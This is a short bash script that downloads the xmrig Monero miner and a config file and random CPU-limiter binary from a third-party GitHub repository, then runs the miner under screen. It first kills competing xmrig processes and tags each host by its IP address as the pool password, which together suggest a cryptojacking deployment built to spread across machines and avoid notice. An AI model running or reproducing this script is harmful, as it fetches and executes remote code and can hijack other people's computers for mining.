#!/bin/bash
killall xmrig
killall cpulimit
PASS=`ip route get 1 | awk '{print $NF;exit}'`
apt install wget cpulimit screen -y
wget https://raw.githubusercontent.com/mzcof/c3/main/cpurandomlimit
chmod +x ./cpurandomlimit
wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar -xvf ./xmrig.tar.gz
chmod +x ./xmrig
rm ./config.json
wget https://raw.githubusercontent.com/mzcof/c3/main/c5a/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
./xmrig
screen ./cpurandomlimit
